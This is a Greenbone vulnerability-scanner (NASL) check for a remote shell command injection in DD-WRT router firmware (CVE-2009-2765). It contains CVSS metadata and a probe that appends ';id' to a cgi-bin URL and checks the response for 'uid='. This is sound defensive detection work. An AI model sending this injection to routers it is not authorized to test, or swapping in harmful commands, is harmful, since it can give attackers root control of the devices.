# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103792");
  script_cve_id("CVE-2009-2765");
  script_version("2023-07-27T05:05:08+0000");
  script_tag(name:"cvss_base", value:"8.3");
  script_tag(name:"cvss_base_vector", value:"AV:A/AC:L/Au:N/C:C/I:C/A:C");

  script_name("DD-WRT Web Management Interface Remote Arbitrary Shell Command Injection Vulnerability");


  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/35742");
  script_xref(name:"URL", value:"http://dd-wrt.com/dd-wrtv3/index.php");
  script_xref(name:"URL", value:"http://www.dd-wrt.com");
  script_xref(name:"URL", value:"http://www.heise.de/ct/artikel/Aufstand-der-Router-1960334.html");

  script_tag(name:"last_modification", value:"2023-07-27 05:05:08 +0000 (Thu, 27 Jul 2023)");
  script_tag(name:"creation_date", value:"2013-09-23 13:51:05 +0200 (Mon, 23 Sep 2013)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_dependencies("gb_get_http_banner.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("httpd/banner");

  script_tag(name:"impact", value:"Remote attackers can exploit this issue to execute arbitrary shell
commands with superuser privileges, which may facilitate a complete
compromise of the affected device.");

  script_tag(name:"vuldetect", value:"Try to execute the 'id' command via HTTP GET request.");

  script_tag(name:"insight", value:"httpd.c in httpd in the management GUI in DD-WRT 24 sp1, and other
versions before build 12533, allows remote attackers to execute arbitrary commands
via shell metacharacters in a request to a cgi-bin/ URI");

  script_tag(name:"solution", value:"Vendor fixes are available.");
  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"summary", value:"DD-WRT is prone to a remote command-injection vulnerability because it
fails to adequately sanitize user-supplied input data.");

  script_tag(name:"affected", value:"DD-WRT v24-sp1 is affected. Other versions may also be vulnerable.");

  exit(0);
}

include("http_func.inc");
include("port_service_func.inc");
include("host_details.inc");



port = http_get_port(default:80);

banner = http_get_remote_headers(port:port);
if("Server: httpd" >!< banner)exit(0);

for(i=5;i<=7;i++) {

  req = 'GET /cgi-bin/;id>&' + i + ' HTTP/1.0\r\n\r\n';
  res = http_send_recv(port:port, data:req, bodyonly:FALSE);

  if("uid=" >< res && "gid=" >< res) {

    security_message(port:port);
    exit(0);

  }
}

exit(0);

